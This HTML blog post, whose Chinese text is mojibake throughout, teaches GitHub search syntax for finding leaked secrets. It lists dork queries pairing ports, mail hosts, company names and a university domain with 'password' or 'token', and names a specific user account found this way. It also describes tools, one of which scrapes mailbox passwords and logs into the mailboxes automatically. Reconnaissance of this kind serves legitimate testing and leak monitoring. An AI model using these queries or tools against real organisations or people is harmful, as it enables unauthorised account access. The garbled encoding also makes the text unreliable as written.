    <content><![CDATA[<p>é€šè¿‡Githubæ¥è·å–ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œæ¥å¸®åŠ©æµ‹è¯•æˆ–è€…SRCèµ„äº§æ”¶é›†ã€‚ã€‚</p>
<a id="more"></a>

<h2 id="0x00-GitHubè¯­æ³•"><a href="#0x00-GitHubè¯­æ³•" class="headerlink" title="0x00 GitHubè¯­æ³•"></a>0x00 GitHubè¯­æ³•</h2><p>é€šè¿‡Githubæ¥è·å–ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œæ¥å¸®åŠ©æµ‹è¯•æˆ–è€…SRCèµ„äº§æ”¶é›†ã€‚ã€‚</p>
<h2 id="0x02-CodeåŸºç¡€è¯­æ³•"><a href="#0x02-CodeåŸºç¡€è¯­æ³•" class="headerlink" title="0x02 CodeåŸºç¡€è¯­æ³•"></a>0x02 CodeåŸºç¡€è¯­æ³•</h2><p>åŸºç¡€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">extension é™å®šç¬¦åŒ¹é…å…·æœ‰ç‰¹å®šæ–‡ä»¶æ‰©å±•åçš„ä»£ç æ–‡ä»¶ã€‚ <span class="comment"># extension:py</span></span><br><span class="line">filename  é™å®šç¬¦åŒ¹é…å…·æœ‰ç‰¹å®šæ–‡ä»¶åçš„ä»£ç æ–‡ä»¶ã€‚		<span class="comment"># filename:password</span></span><br><span class="line">size			é™å®šç¬¦åŸºäºä»£ç æ‰€åœ¨æ–‡ä»¶çš„å¤§å°æœç´¢æºä»£ç ã€‚<span class="comment"># size:10 &#123;é»˜è®¤KB&#125;ï¼Œsize:&gt;10 &#123;å¤§äºã€å°äºå’ŒèŒƒå›´é™å®šç¬¦&#125;</span></span><br><span class="line">language	åŸºäºæ‰€ç¼–å†™çš„è¯­è¨€æœç´¢ä»£ç ã€‚							<span class="comment"># language:python</span></span><br><span class="line">path 			é™å®šç¬¦æœç´¢ä»“åº“ä¸­ç‰¹å®šä½ç½®æ˜¾ç¤ºçš„æºä»£ç ã€‚		<span class="comment"># path:/	path:app/public </span></span><br><span class="line">user/org	ç‰¹å®šç”¨æˆ·æˆ–ç»„ç»‡æ‹¥æœ‰çš„æ‰€æœ‰ä»“åº“ä¸­æœç´¢ä»£ç 		<span class="comment"># user:defunkt , org:github</span></span><br><span class="line"><span class="keyword">in</span>				é™å®šç¬¦å¯ä»¥å°†æœç´¢é™åˆ¶ä¸ºæºä»£ç æ–‡ä»¶çš„å†…å®¹ã€æ–‡ä»¶è·¯å¾„æˆ–ä¸¤è€…ã€‚ <span class="comment"># in:file  in:path</span></span><br></pre></td></tr></table></figure>

<p>é‡ç‚¹å‚æ•°ï¼š</p>
<ul>
<li><code>in</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span>:file		<span class="keyword">in</span>:file password åŒ¹é…æ–‡ä»¶ä¸­å«æœ‰password</span><br><span class="line"><span class="keyword">in</span>:path		<span class="keyword">in</span>:path password åŒ¹é…é¡¹ç›®è·¯å¾„ä¸­å«æœ‰password</span><br><span class="line"><span class="keyword">in</span>:name <span class="built_in">test</span>               ä»“åº“æ ‡é¢˜æœç´¢å«æœ‰å…³é”®å­— SpringCloud</span><br><span class="line"><span class="keyword">in</span>:descripton <span class="built_in">test</span>         ä»“åº“æè¿°æœç´¢å«æœ‰å…³é”®å­—</span><br><span class="line"><span class="keyword">in</span>:readme <span class="built_in">test</span>             Readmeæ–‡ä»¶æœç´ å«æœ‰å…³é”®å­—</span><br><span class="line"><span class="keyword">in</span>:title	warning <span class="keyword">in</span>:title åŒ¹é…å…¶æ ‡é¢˜ä¸­å«æœ‰ <span class="string">&quot;warning&quot;</span> çš„è®®é¢˜ã€‚</span><br><span class="line"><span class="keyword">in</span>:body		error <span class="keyword">in</span>:title,body åŒ¹é…å…¶æ ‡é¢˜æˆ–æ­£æ–‡ä¸­å«æœ‰ <span class="string">&quot;error&quot;</span> çš„è®®é¢˜ã€‚</span><br><span class="line"><span class="keyword">in</span>:comments		shipit <span class="keyword">in</span>:comments åŒ¹é…å…¶è¯„è®ºä¸­æåŠ <span class="string">&quot;shipit&quot;</span> çš„è®®é¢˜ã€‚</span><br></pre></td></tr></table></figure>

<ul>
<li><code>is</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">is:pr			event is:pr åŒ¹é…å«æœ‰ <span class="string">&quot;event&quot;</span> å­—æ ·çš„æ‹‰å–è¯·æ±‚ã€‚</span><br><span class="line">is:issue	is:issue label:bug is:closed åŒ¹é…å…·æœ‰æ ‡ç­¾ <span class="string">&quot;bug&quot;</span> çš„å·²å…³é—­è®®é¢˜ã€‚</span><br><span class="line">is:open		performance is:open is:issue åŒ¹é…å«æœ‰ <span class="string">&quot;performance&quot;</span> å­—æ ·çš„å¼€æ”¾è®®é¢˜ã€‚</span><br><span class="line">is:closed		android is:closed åŒ¹é…å«æœ‰ <span class="string">&quot;android&quot;</span> å­—æ ·çš„å·²å…³é—­è®®é¢˜å’Œæ‹‰å–è¯·æ±‚ã€‚</span><br><span class="line">is:public		is:public åŒ¹é…æ‰€æœ‰å…¬å…±ä»“åº“ä¸­çš„è®®é¢˜å’Œæ‹‰å–è¯·æ±‚ã€‚</span><br><span class="line">is:private	is:private cupcake åŒ¹é…æ‚¨å…·æœ‰è®¿é—®æƒé™çš„ç§æœ‰ä»“åº“ä¸­å«æœ‰ <span class="string">&quot;cupcake&quot;</span> å­—æ ·çš„è®®é¢˜å’Œæ‹‰å–è¯·æ±‚ã€‚</span><br><span class="line">is:merged			bugfix is:pr is:merged åŒ¹é…å«æœ‰ <span class="string">&quot;bugfix&quot;</span> å­—æ ·çš„å·²åˆå¹¶æ‹‰å–è¯·æ±‚ã€‚</span><br><span class="line">is:unmerged		error is:unmerged åŒ¹é…å«æœ‰ <span class="string">&quot;error&quot;</span> å­—æ ·çš„å·²å…³é—­è®®é¢˜å’Œæ‹‰å–è¯·æ±‚ã€‚</span><br><span class="line">is:locked		code of conduct is:locked is:issue archived:<span class="literal">false</span> åŒ¹é…æœªå­˜æ¡£ä»“åº“ä¸­å…·æœ‰å·²é”å®šå¯¹è¯ä¸”å«æœ‰ <span class="string">&quot;code of conduct&quot;</span> å­—æ ·çš„è®®é¢˜æˆ–æ‹‰å–è¯·æ±‚ã€‚</span><br><span class="line">is:unlocked	code of conduct is:unlocked is:issue archived:<span class="literal">false</span> åŒ¹é…æœªå­˜æ¡£ä»“åº“ä¸­å…·æœ‰æœªé”å®šå¯¹è¯ä¸”å«æœ‰ <span class="string">&quot;code of conduct&quot;</span> å­—æ ·çš„è®®é¢˜æˆ–æ‹‰å–è¯·æ±‚ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="æŒ‰æ–‡ä»¶å†…å®¹æˆ–æ–‡ä»¶è·¯å¾„æœç´¢"><a href="#æŒ‰æ–‡ä»¶å†…å®¹æˆ–æ–‡ä»¶è·¯å¾„æœç´¢" class="headerlink" title="æŒ‰æ–‡ä»¶å†…å®¹æˆ–æ–‡ä»¶è·¯å¾„æœç´¢"></a><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1jb2RlI3NlYXJjaC1ieS10aGUtZmlsZS1jb250ZW50cy1vci1maWxlLXBhdGg=">æŒ‰æ–‡ä»¶å†…å®¹æˆ–æ–‡ä»¶è·¯å¾„æœç´¢<i class="fa fa-external-link-alt"></i></span></h3><p>ä½¿ç”¨ <code>in</code> é™å®šç¬¦ï¼Œæ‚¨å¯ä»¥å°†æœç´¢é™åˆ¶ä¸ºæºä»£ç æ–‡ä»¶çš„å†…å®¹ã€æ–‡ä»¶è·¯å¾„æˆ–ä¸¤è€…ã€‚ å¦‚æœçœç•¥æ­¤é™å®šç¬¦ï¼Œåˆ™åªæœç´¢æ–‡ä»¶å†…å®¹ã€‚</p>
<ul>
<li>å¿…é¡»ç™»å½•æ‰èƒ½è·¨æ‰€æœ‰å…¬å…±ä»“åº“æœç´¢ä»£ç ã€‚</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vYXJ0aWNsZXMvYWJvdXQtZm9ya3M=">å¤åˆ»<i class="fa fa-external-link-alt"></i></span>ä¸­çš„ä»£ç ä»…å½“å¤åˆ»çš„æ˜Ÿå·è¶…è¿‡çˆ¶çº§ä»“åº“æ—¶å¯æœç´¢ã€‚ æ˜Ÿå·å°‘äºçˆ¶ä»“åº“çš„å¤åˆ»<strong>ä¸</strong>ä¸ºä»£ç æœç´¢ç¼–ç´¢å¼•ã€‚ è¦åœ¨æœç´¢ç»“æœä¸­åŒ…æ‹¬æ˜Ÿå·æ¯”å…¶çˆ¶é¡¹å¤šçš„å¤åˆ»ï¼Œæ‚¨éœ€è¦å°† <code>fork:true</code> æˆ– <code>fork:only</code> æ·»åŠ åˆ°æŸ¥è¯¢ã€‚ æ›´å¤šä¿¡æ¯è¯·å‚é˜…â€œ<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vYXJ0aWNsZXMvc2VhcmNoaW5nLWluLWZvcmtz">åœ¨å¤åˆ»ä¸­æœç´¢<i class="fa fa-external-link-alt"></i></span>â€ã€‚</li>
<li>åªæœ‰<em>é»˜è®¤åˆ†æ”¯</em>ç¼–ç´¢å¼•è¿›è¡Œä»£ç æœç´¢ã€‚ åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™å°†æˆä¸º <code>master</code> åˆ†æ”¯ã€‚</li>
<li>åªæœ‰å°äº 384 KB çš„æ–‡ä»¶å¯æœç´¢ã€‚</li>
<li>åªæœ‰å°‘äº 500,000 ä¸ªæ–‡ä»¶çš„ä»“åº“å¯æœç´¢ã€‚</li>
<li>ç™»å½•çš„ç”¨æˆ·å¯ä»¥æœç´¢æ‰€æœ‰å…¬å…±ä»“åº“ã€‚</li>
<li>é™¤äº† <a href="https://docs.github.com/cn/github/searching-for-information-on-github/searching-code#search-by-filename"><code>filename</code></a> æœç´¢ä»¥å¤–ï¼Œæœç´¢æºä»£ç æ—¶å¿…é¡»å§‹ç»ˆåŒ…æ‹¬è‡³å°‘ä¸€ä¸ªæœç´¢è¯ã€‚ ä¾‹å¦‚ï¼Œæœç´¢ <a href="https://github.com/search?utf8=%E2%9C%93&q=language:javascript&type=Code&ref=searchresults"><code>language:javascript</code></a> æ— æ•ˆï¼Œè€Œæœç´¢ <a href="https://github.com/search?utf8=%E2%9C%93&q=amazing+language:javascript&type=Code&ref=searchresults"><code>amazing language:javascript</code></a> æœ‰æ•ˆã€‚</li>
<li>æœç´¢ç»“æœæœ€å¤šå¯æ˜¾ç¤ºåŒä¸€æ–‡ä»¶çš„ä¸¤ä¸ªåˆ†æ®µï¼Œä½†æ–‡ä»¶å†…å¯èƒ½æœ‰æ›´å¤šç»“æœã€‚</li>
<li>æ‚¨æ— æ³•ä½¿ç”¨ä»¥ä¸‹é€šé…ç¬¦ä½œä¸ºæœç´¢æŸ¥è¯¢çš„ä¸€éƒ¨åˆ†ï¼š<code>. , : ; / \ </code> â€˜ â€œ = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) { } [ ]`. æœç´¢åªä¼šå¿½ç•¥è¿™äº›ç¬¦å·ã€‚</li>
</ul>
<table>
<thead>
<tr>
<th>é™å®šç¬¦</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>in:file</code></td>
<td><a href="https://github.com/search?q=octocat+in:file&type=Code"><strong>octocat in:file</strong></a> åŒ¹é…æ–‡ä»¶å†…å®¹ä¸­å‡ºç° â€œoctocatâ€ çš„ä»£ç ã€‚</td>
</tr>
<tr>
<td><code>in:path</code></td>
<td><a href="https://github.com/search?q=octocat+in:path&type=Code"><strong>octocat in:path</strong></a> åŒ¹é…æ–‡ä»¶è·¯å¾„ä¸­å‡ºç° â€œoctocatâ€ çš„ä»£ç ã€‚</td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/search?q=octocat+in:file,path&type=Code"><strong>octocat in:file,path</strong></a> åŒ¹é…æ–‡ä»¶å†…å®¹æˆ–æ–‡ä»¶è·¯å¾„ä¸­å‡ºç° â€œoctocatâ€ çš„ä»£ç ã€‚</td>
</tr>
</tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<p><img src="/posts/a1b49219/0001.png"></p>
<h3 id="åœ¨ç”¨æˆ·æˆ–ç»„ç»‡çš„ä»“åº“å†…æœç´¢"><a href="#åœ¨ç”¨æˆ·æˆ–ç»„ç»‡çš„ä»“åº“å†…æœç´¢" class="headerlink" title="åœ¨ç”¨æˆ·æˆ–ç»„ç»‡çš„ä»“åº“å†…æœç´¢"></a><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1jb2RlI3NlYXJjaC13aXRoaW4tYS11c2Vycy1vci1vcmdhbml6YXRpb25zLXJlcG9zaXRvcmllcw==">åœ¨ç”¨æˆ·æˆ–ç»„ç»‡çš„ä»“åº“å†…æœç´¢<i class="fa fa-external-link-alt"></i></span></h3><p>è¦åœ¨ç‰¹å®šç”¨æˆ·æˆ–ç»„ç»‡æ‹¥æœ‰çš„æ‰€æœ‰ä»“åº“ä¸­æœç´¢ä»£ç ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <code>user</code> æˆ– <code>org</code> é™å®šç¬¦ã€‚ è¦åœ¨ç‰¹å®šä»“åº“ä¸­æœç´¢ä»£ç ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <code>repo</code> é™å®šç¬¦ã€‚</p>
<table>
<thead>
<tr>
<th>é™å®šç¬¦</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>user:*USERNAME*</code></td>
<td><a href="https://github.com/search?q=user:github+extension:rb&type=Code"><strong>user:defunkt extension:rb</strong></a> matches code from @defunkt that ends in <em>.rb</em>.</td>
</tr>
<tr>
<td><code>org:*ORGNAME*</code></td>
<td><a href="https://github.com/search?utf8=%E2%9C%93&q=org:github+extension:js&type=Code"><strong>org:github extension:js</strong></a> matches code from GitHub that ends in <em>.js</em>.</td>
</tr>
<tr>
<td><code>repo:*USERNAME/REPOSITORY*</code></td>
<td><a href="https://github.com/search?q=repo:mozilla/shumway+extension:as&type=Code"><strong>repo:mozilla/shumway extension:as</strong></a> matches code from @mozillaâ€™s shumway project that ends in <em>.as</em>.</td>
</tr>
</tbody></table>
<p><img src="/posts/a1b49219/0002.png"></p>
<h3 id="æŒ‰è¯­è¨€æœç´¢"><a href="#æŒ‰è¯­è¨€æœç´¢" class="headerlink" title="æŒ‰è¯­è¨€æœç´¢"></a><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1jb2RlI3NlYXJjaC1ieS1sYW5ndWFnZQ==">æŒ‰è¯­è¨€æœç´¢<i class="fa fa-external-link-alt"></i></span></h3><p>æ‚¨å¯ä»¥åŸºäºæ‰€ç¼–å†™çš„è¯­è¨€æœç´¢ä»£ç ã€‚</p>
<table>
<thead>
<tr>
<th>é™å®šç¬¦</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>language:*LANGUAGE*</code></td>
<td><a href="https://github.com/search?q=element+language:xml+size:100&type=Code"><strong>element language:xml size:100</strong></a> åŒ¹é…æ ‡è®°ä¸º XML ä¸”æ°å¥½æœ‰ 100 ä¸ªå­—èŠ‚çš„å¹¶å«æœ‰ â€œelementâ€ å­—æ ·çš„ä»£ç ã€‚</td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/search?q=display+language:scss&type=Code"><strong>display language:scss</strong></a> åŒ¹é…æ ‡è®°ä¸º SCSS ä¸”å«æœ‰ â€œdisplayâ€ å­—æ ·çš„ä»£ç ã€‚</td>
</tr>
<tr>
<td></td>
<td><a href="https://github.com/search?utf8=%E2%9C%93&q=org:mozilla+language:markdown&type=Code"><strong>org:mozilla language:markdown</strong></a> åŒ¹é…æ ‡è®°ä¸º Markdown ä¸”æ¥è‡ªæ‰€æœ‰ @mozilla ä»“åº“çš„ä»£ç ã€‚</td>
</tr>
</tbody></table>
<p><img src="/posts/a1b49219/0004.png" alt="image-20200513094616236"></p>
<h2 id="0x03-å®æˆ˜æœç´¢"><a href="#0x03-å®æˆ˜æœç´¢" class="headerlink" title="0x03 å®æˆ˜æœç´¢"></a>0x03 å®æˆ˜æœç´¢</h2><h3 id="æ•°æ®åº“æœç´¢"><a href="#æ•°æ®åº“æœç´¢" class="headerlink" title="æ•°æ®åº“æœç´¢"></a>æ•°æ®åº“æœç´¢</h3><p>æ ¹æ®ç«¯å£å·å³å¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jdbc 3306 password</span><br><span class="line">jdbc 1433 </span><br><span class="line">jdbc 1521 password</span><br><span class="line">6379 password</span><br><span class="line">...</span><br><span class="line">&#123;3389 password&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a1b49219/0005.png" alt="image-20200515100126043"></p>
<h3 id="é‚®ç®±"><a href="#é‚®ç®±" class="headerlink" title="é‚®ç®±"></a>é‚®ç®±</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smtp @qq.com password</span><br><span class="line">smtp @163.com password</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a1b49219/0006.png" alt="image-20200513111154874"></p>
<h3 id="å­—ç¬¦ä¸²æœç´¢"><a href="#å­—ç¬¦ä¸²æœç´¢" class="headerlink" title="å­—ç¬¦ä¸²æœç´¢"></a>å­—ç¬¦ä¸²æœç´¢</h3><p>æŒ‡å®šå­—ç¬¦ä¸²æœç´¢ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mogujie password </span><br><span class="line">gmail password</span><br><span class="line">fofa_key</span><br><span class="line">shodan_api_key</span><br><span class="line">sina.com password</span><br><span class="line">mysql_password</span><br><span class="line">svn password</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a1b49219/0007.png" alt="image-20200513113724070"></p>
<h3 id="æ ¹æ®å…¬å¸åæœç´¢"><a href="#æ ¹æ®å…¬å¸åæœç´¢" class="headerlink" title="æ ¹æ®å…¬å¸åæœç´¢"></a>æ ¹æ®å…¬å¸åæœç´¢</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;Company&quot;</span> password</span><br><span class="line"><span class="string">&quot;Company&quot;</span> ftp</span><br><span class="line"><span class="string">&quot;Company&quot;</span> token</span><br><span class="line"><span class="string">&quot;Company&quot;</span> key</span><br><span class="line"><span class="string">&quot;Company&quot;</span> JDBC</span><br><span class="line"><span class="string">&quot;Company&quot;</span> ssh2_auth_password</span><br><span class="line"><span class="string">&quot;Company&quot;</span> send_keys and send,keys</span><br><span class="line"><span class="string">&quot;Company&quot;</span> connectionString</span><br><span class="line"><span class="string">&quot;Company&quot;</span> security_credentials</span><br><span class="line"><span class="string">&quot;Company&quot;</span> vsphere</span><br><span class="line">&#123;pass,secert,credentials,config,login...&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;sina&quot;</span> language:python password NOT sina123com <span class="comment"># æœç´¢æŸå…¬å¸/ç»„ç»‡ä¸­ç¼–ç¨‹è¯­è¨€ä¸ºpython ä¸”ä¸åŒ…å«sina123comçš„passwordå­—ç¬¦</span></span><br></pre></td></tr></table></figure>

<p>ç¤ºä¾‹ï¼š<code>https://github.com/search?p=3&amp;q=%22sina%22+password&amp;type=Code</code></p>
<p><img src="/posts/a1b49219/0008.png" alt="image-20200514164000972"></p>
<h2 id="0x04-åˆ’é‡ç‚¹"><a href="#0x04-åˆ’é‡ç‚¹" class="headerlink" title="0x04 åˆ’é‡ç‚¹"></a>0x04 åˆ’é‡ç‚¹</h2><p>ä¸»è¦æ˜¯å¿«é€Ÿçš„æ‰¾åˆ°ç›®æ ‡çš„ç›¸å…³ä¿¡æ¯ã€‚</p>
<h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;edu&quot;</span> password</span><br><span class="line"><span class="string">&quot;edu&quot;</span> <span class="built_in">pwd</span></span><br><span class="line"><span class="string">&quot;zju.edu.cn&quot;</span> password</span><br><span class="line"><span class="string">&quot;zju.edu.cn&quot;</span> send_keys</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li><code>&quot;zju.edu.cn&quot; send_keys</code></li>
</ul>
<p><img src="/posts/a1b49219/0009.png" alt="image-20200515093802084"></p>
<ul>
<li>æ ¹æ®å‘ç°çš„send_keyså»æœç´¢è¯¥ç”¨æˆ·ä»“åº“ï¼š<code>user:ken20001207  password</code></li>
</ul>
<p><img src="/posts/a1b49219/0010.png" alt="image-20200515093635522"></p>
<h2 id="0x04-å·¥å…·ä»‹ç»"><a href="#0x04-å·¥å…·ä»‹ç»" class="headerlink" title="0x04 å·¥å…·ä»‹ç»"></a>0x04 å·¥å…·ä»‹ç»</h2><h3 id="Github-Nuggests"><a href="#Github-Nuggests" class="headerlink" title="Github_Nuggests"></a><strong><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2F6MG5lL0dpdGh1Yl9OdWdnZXN0cw==">Github_Nuggests<i class="fa fa-external-link-alt"></i></span></strong></h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2F6MG5lL0dpdGh1Yl9OdWdnZXN0cw==">https://github.com/az0ne/Github_Nuggests<i class="fa fa-external-link-alt"></i></span></p>
<p>Github_Nuggestsè‡ªåŠ¨çˆ¬å–Githubä¸Šæ–‡ä»¶æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼ŒæŠ“å–é‚®ç®±å¯†ç å¹¶è‡ªåŠ¨ç™»å½•é‚®ç®±éªŒè¯ï¼Œæ”¯æŒ126ï¼Œqqï¼Œsinaï¼Œ163é‚®ç®±</p>
<p><code>python Nuggests.py 100</code> (100ä¸ºé¡µæ•°æœ€å¤§ä¸€ç™¾é¡µ) å¦‚æœcookiesè¿‡æœŸï¼Œè¯·å°†Nuggests.py æ–‡ä»¶ä¸­{Cookies:xxxxx}æ¢æˆä½ githubè´¦å·ç™»é™†çš„Cookieã€‚</p>
<p><strong>æ ¸å¿ƒä»£ç ï¼š</strong></p>
<p><img src="/posts/a1b49219/0011.png" alt="image-20200515104306556"></p>
<p>åˆ†æï¼š</p>
<ul>
<li><p>é¦–å…ˆæ ¹æ®è§„åˆ™<code>smtp+163.com</code>çˆ¬å–,ç„¶ååŒ¹é…æ‰€æœ‰çš„<code>a</code>æ ‡ç­¾,å†åŒ¹é…æ˜¯å¦å«æœ‰<code>blob</code>,ç„¶åå¤„ç†å¾—åˆ°æœ€ç»ˆçš„åœ°å€ã€‚</p>
</li>
<li><p>è®¿é—®æœ€ç»ˆåœ°å€ï¼Œç„¶åsplité»˜è®¤åˆ†å‰²ï¼Œæœ€åæŸ¥æ‰¾åŒ…å«<code>user</code>,<code>pass</code>å­—ç¬¦çš„ï¼Œå¹¶+2è¾“å‡º(è¿™é‡Œé»˜è®¤åˆ†å‰²ä¸ºæ‰€æœ‰çš„ç©ºå­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€æ¢è¡Œ(\n)ã€åˆ¶è¡¨ç¬¦(\t)ç­‰ã€‚ username = zhangsan  password =zhangsan!@#)</p>
</li>
<li><p>å› æ­¤ä¼šå¯¼è‡´<code>username=zhangsan,password=zhangsan!@#</code>æ— æ³•è¯†åˆ«å‡ºæ¥ã€‚</p>
</li>
</ul>
<h3 id="theHarvester"><a href="#theHarvester" class="headerlink" title="theHarvester"></a>theHarvester</h3><p>ä»ç™¾åº¦ï¼Œå¿…åº”ï¼Œè°·æ­Œï¼ŒGitHubç­‰æ”¶é›†ç”µå­é‚®ä»¶ï¼Œåç§°ï¼Œå­åŸŸï¼ŒIPå’ŒURLã€‚ï¼ˆéƒ¨åˆ†éœ€è¦é…ç½®APIï¼‰</p>
<p><img src="/posts/a1b49219/0012.png" alt="image-20200515135959821"></p>
<h3 id="GSIL"><a href="#GSIL" class="headerlink" title="GSIL"></a>GSIL</h3><p><span class="exturl" data-url="aHR0cDovL2dzaWwuZmVlaS5jbi8=">http://gsil.feei.cn/<i class="fa fa-external-link-alt"></i></span></p>
<p>é¦–å…ˆè¦é…ç½®<code>config.gsil</code>é‚®ç®±ï¼Œæ‰«æå®Œæ¯•ä»¥åä¼šå°†ç»“æœå‘é€åˆ°é‚®ä»¶.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[mail]</span><br><span class="line">host : smtp.exmail.qq.com</span><br><span class="line"><span class="comment"># SMTPç«¯å£(éSSLç«¯å£ï¼Œä½†ä¼šä½¿ç”¨TLSåŠ å¯†)</span></span><br><span class="line">port : <span class="number">25</span></span><br><span class="line"><span class="comment"># å¤šä¸ªå‘ä»¶äººä½¿ç”¨é€—å·(,)åˆ†éš”</span></span><br><span class="line">mails : gsil@feei.cn</span><br><span class="line"><span class="keyword">from</span> : GSIL</span><br><span class="line">password : your_password</span><br><span class="line"><span class="comment"># å¤šä¸ªæ”¶ä»¶äººä½¿ç”¨é€—å·(,)åˆ†éš”</span></span><br><span class="line">to : feei@feei.cn</span><br><span class="line"></span><br><span class="line">[github]</span><br><span class="line"><span class="comment"># æ‰«æåˆ°çš„æ¼æ´ä»“åº“æ˜¯å¦ç«‹åˆ»Cloneåˆ°æœ¬åœ°ï¼ˆ~/.gsil/codes/ï¼‰</span></span><br><span class="line"><span class="comment"># æ­¤é€‰é¡¹ç”¨ä½œç›‘æ§å…¶å®ƒå‚å•†ï¼Œé¿å…å› ä¸ºä»“åº“æ‰€æœ‰è€…å‘ç°åè¢«åˆ é™¤</span></span><br><span class="line">clone: false</span><br><span class="line"></span><br><span class="line"><span class="comment"># GitHub Tokenç”¨æ¥è°ƒç”¨ç›¸å…³APIï¼Œå¤šä¸ªTokenä½¿ç”¨é€—å·(,)åˆ†éš”</span></span><br><span class="line"><span class="comment"># https://github.com/settings/tokens</span></span><br><span class="line">tokens : your_token</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹<code>rules.gsil</code>ä¸­çš„æ‰«æè§„åˆ™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment"># ä¸€çº§åˆ†ç±»ï¼Œä¸€èˆ¬ä½¿ç”¨å…¬å¸åï¼Œç”¨ä½œå¼€å¯æ‰«æçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆpython gsil.py testï¼‰</span></span><br><span class="line">    <span class="string">&quot;test&quot;</span>: &#123;</span><br><span class="line">        <span class="comment"># äºŒçº§åˆ†ç±»ï¼Œä¸€èˆ¬ä½¿ç”¨äº§å“çº¿</span></span><br><span class="line">        <span class="string">&quot;mogujie&quot;</span>: &#123;</span><br><span class="line">            <span class="comment"># å…¬å¸å†…éƒ¨åŸŸå</span></span><br><span class="line">            <span class="string">&quot;\&quot;mogujie.org\&quot;&quot;</span>: &#123;</span><br><span class="line">                <span class="comment"># mode/exté»˜è®¤å¯ä¸å¡«</span></span><br><span class="line">                <span class="string">&quot;mode&quot;</span>: <span class="string">&quot;normal-match&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ext&quot;</span>: <span class="string">&quot;php,java,python,go,js,properties&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment"># å…¬å¸ä»£ç ç‰¹å¾</span></span><br><span class="line">            <span class="string">&quot;copyright meili inc&quot;</span>: &#123;&#125;,</span><br><span class="line">            <span class="comment"># å†…éƒ¨ä¸»æœºåŸŸå</span></span><br><span class="line">            <span class="string">&quot;yewu1.db.mogujie.host&quot;</span>: &#123;&#125;,</span><br><span class="line">            <span class="comment"># å¤–éƒ¨é‚®ç®±</span></span><br><span class="line">            <span class="string">&quot;mail.mogujie.com&quot;</span>: &#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;meilishuo&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;meilishuo.org&quot;</span>: &#123;&#125;,</span><br><span class="line">            <span class="string">&quot;meilishuo.io&quot;</span>: &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Hawkeye"><a href="#Hawkeye" class="headerlink" title="Hawkeye"></a>Hawkeye</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4YnVnL0hhd2tleWU=">https://github.com/0xbug/Hawkeye<i class="fa fa-external-link-alt"></i></span></p>
<p>å‚è€ƒï¼š</p>
<p>[1] <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1vbi1naXRodWI=">https://docs.github.com/cn/github/searching-for-information-on-github/searching-on-github<i class="fa fa-external-link-alt"></i></span></p>
